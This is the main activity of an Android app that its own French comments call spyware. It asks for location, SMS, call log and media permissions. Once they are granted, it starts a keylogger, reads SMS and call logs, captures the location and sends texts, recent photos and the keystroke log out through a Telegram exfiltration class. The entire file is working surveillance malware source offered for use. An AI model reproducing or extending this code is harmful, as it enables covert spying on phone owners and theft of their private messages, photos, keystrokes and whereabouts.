package com.ware.spyk;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;

    // Toutes les permissions nécessaires pour le spyware
    private List<String> REQUIRED_PERMISSIONS = new ArrayList<>(Arrays.asList(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
    ));

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            REQUIRED_PERMISSIONS.add(Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            REQUIRED_PERMISSIONS.add(Manifest.permission.READ_EXTERNAL_STORAGE);

        }
        // Vérifie directement la permission
        if (hasAllPermissions()) {
            Keylogger.start();
            Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
            Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
            Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
            TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
            TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
            //startLocationService();
            GetLocalisation.captureOnce(this);
            Log.d("MainActivity", "test");
            File[] photos = PhotoCollector.getRecentPhotos(getApplicationContext(), 10);
            Log.d("MainActivity", "nombre photo " + photos.length);
            for (File photo : photos) {
                Log.d("MainActivity", "Photo : " + photo.getAbsolutePath());
                TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg");
            }

            // ⌨️ 2. Exfiltration du fichier de log du keylogger
            File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
            if (keylog.exists()) {
                TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream");
            }
        } else {
            requestAllPermissions(); // Demande la permission sinon
            Log.d("MainActivity", "Demande de permission");
        }
    }

    private boolean hasLocationPermission() {
        return ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestLocationPermission() {
        ActivityCompat.requestPermissions(
                this,
                new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                100
        );
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    private void startLocationService() {
        Intent intent = new Intent(this, LocalisationService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            Log.d("MainActivity", "Démarrage du service en foreground.");
            startForegroundService(intent); // ✅ Pour Android 8+
        } else {
            startService(intent); // ✅ Pour Android < 8
        }
    }

    // Callback pour gérer la réponse à la demande de permission
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Keylogger.start();
                Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
                Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
                Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
                TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
                TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
                //startLocationService(); // Permission accordée, on lance le service
                GetLocalisation.captureOnce(this);
                File[] photos = PhotoCollector.getRecentPhotos(getApplicationContext(), 10);
                for (File photo : photos) {
                    TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg");
                }

                // ⌨️ 2. Exfiltration du fichier de log du keylogger
                File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
                if (keylog.exists()) {
                    TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream");
                }
            } else {
                Log.d("Permissions", "L'utilisateur a refusé une ou plusieurs permissions");
            }
        }
    }
}